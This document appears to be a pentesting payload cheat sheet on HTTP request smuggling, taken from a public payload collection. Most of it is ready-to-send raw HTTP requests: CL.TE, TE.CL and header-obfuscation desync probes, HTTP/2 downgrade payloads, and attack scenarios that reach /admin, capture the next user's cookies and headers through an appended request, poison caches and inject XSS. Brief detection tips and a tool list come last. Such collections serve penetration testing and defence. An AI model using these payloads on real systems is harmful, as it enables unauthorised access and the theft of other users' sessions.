# HTTP Request Smuggling Payloads

> Source: PayloadsAllTheThings — Request Smuggling

## Core Concept

Front-end (reverse proxy) and back-end (origin server) disagree on where one request ends and another begins. Exploit the discrepancy between `Content-Length` and `Transfer-Encoding` headers.

## CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)

### Basic Detection

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Poisoning Next Request

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The back-end sees the `G` as the start of the next request (`GPOST / HTTP/1.1`), causing a 405 or different response.

### Full Request Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

## TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)

### Basic Detection

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### Request Poisoning

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

## TE.TE Obfuscation (Both Support TE, One Can Be Confused)

Obfuscate `Transfer-Encoding` so one server ignores it:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked                (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked                (leading space)
X: X[\n]Transfer-Encoding: chunked         (header injection)
Transfer-Encoding\n: chunked               (newline before colon)
Transfer-Encoding: chunk                   (truncated)
```

## HTTP/2 Downgrade Smuggling

HTTP/2 request converted to HTTP/1.1 by the front-end:

```
:method GET
:path /
:authority target.com
header: ignored\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
```

### H2.CL (HTTP/2 with Content-Length Desync)

```
:method POST
:path /
:authority target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com

```

### H2.TE (HTTP/2 with Transfer-Encoding Injection)

```
:method POST
:path /
:authority target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

## Exploitation Scenarios

### Access Control Bypass

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 70
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

```

### Credential Capture

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data=
```

The next user's request gets appended to `data=`, sending their headers/cookies to `/log`.

### Cache Poisoning

Smuggle a request that returns attacker-controlled content for a cached URL.

### XSS via Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

```

## Detection Tips

```
1. Send CL.TE probe — if response is delayed or different, likely vulnerable
2. Send TE.CL probe — look for 400/405 errors on the "smuggled" portion
3. Use Burp Scanner's HTTP Request Smuggling detection
4. Test with timing: smuggled SLEEP-like behavior
5. Always test HTTP/2 downgrade if target uses H2
```

## Tools

```
- Burp Suite Scanner (built-in smuggling checks)
- smuggler.py (https://github.com/defparam/smuggler)
- http-request-smuggling (Burp extension)
```
